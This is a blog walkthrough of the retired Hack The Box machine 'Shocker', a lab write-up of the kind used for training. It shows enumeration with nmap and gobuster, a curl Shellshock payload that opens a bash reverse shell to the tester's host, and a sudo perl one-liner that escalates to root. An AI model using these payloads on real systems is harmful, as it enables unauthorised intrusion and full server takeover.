---
layout: post
title: "HTB-Shocker"
date: 2020-02-16 22:02:00 +0000
categories: HTB-Walkthrough
---

![shocker](/assets/img/shocker.png)

This is another box from the HTB 'retired' list, it's also very much like one of the boxes found in the PWK labs on the way to the OSCP qualification.

Jumping in with Nmap then...

`nmap -sV -Pn 10.10.10.56 |tee -a shock.txt`

```

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Unusual to find ssh on a port other than 22, a bit of security through obscurity perhaps, it may mean that it is somehow otherwise vulnerable.
Lets check out this possibility with nmap...

```

root@kali:~/HTB/prep/shocker# nmap -sSV 10.10.10.56 --script=vuln |tee -a shock.txt 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-09 18:40 GMT
Nmap scan report for 10.10.10.56
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Nothing immediately apparent, and nikto on the webport 80 gives nothing.

gobuster finds /cgi-bin with a common.txt scan...we'll scan again looking for scripts...

```

root@kali:~/HTB/retired# gobuster dir -u http://10.10.10.56/cgi-bin/ -w /root/wordlists/SecLists/Discovery/Web-Content/common.txt -x .sh,.txt,.php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56/cgi-bin/
[+] Threads:        10
[+] Wordlist:       /root/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     sh,txt,php
[+] Timeout:        10s
===============================================================
2020/02/16 18:16:23 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.sh (Status: 403)
/.hta.txt (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.sh (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.sh (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/user.sh (Status: 200)
===============================================================
2020/02/16 18:19:33 Finished
===============================================================

```

/user.sh needs to be looked at...

```

Content-Type: text/plain

Just an uptime test script

 18:24:12 up 54 min,  0 users,  load average: 0.01, 0.00, 0.00

```

Well, nothing usefull in itself, but what it does mean (cgi-bin accessible), is that this installation of Apache will likely be vulnerable to a Shellshock exploit.

```

curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.34/6969 0>&1' http://10.10.10.56/cgi-bin/user.sh

```

This attempt works straight off the bat...Shellshock is  an important vulnerability to know about.
[Wiki on shellshock](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29)

###############################################################

So we got user shell on the target...

```

shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

`sudo -l` is always one of the first commands I try when I get an user shell, for this sort of reason.
Getting root now is very simple. Shelly can execute a perl command or script using sudo (which gives 'super user' privileges) without having to enter a password.
We can use this to invoke a bash shell that will reflect the privileges of the user that called it. Since sudo commands are run 'as root', the resulting shell will be a root shell.

```

shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
sudo /usr/bin/perl -e 'exec "/bin/bash";'
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/home/shelly
ls
user.txt
cat user.txt
2exxxxxxxxxxxxxxxxxxxxxxxxxxxx33
cat /root/root.txt
5xxxxxxxxxxxxxxxxxxxxxxxxxxxxx67

```

###########################################

Simple when you know.
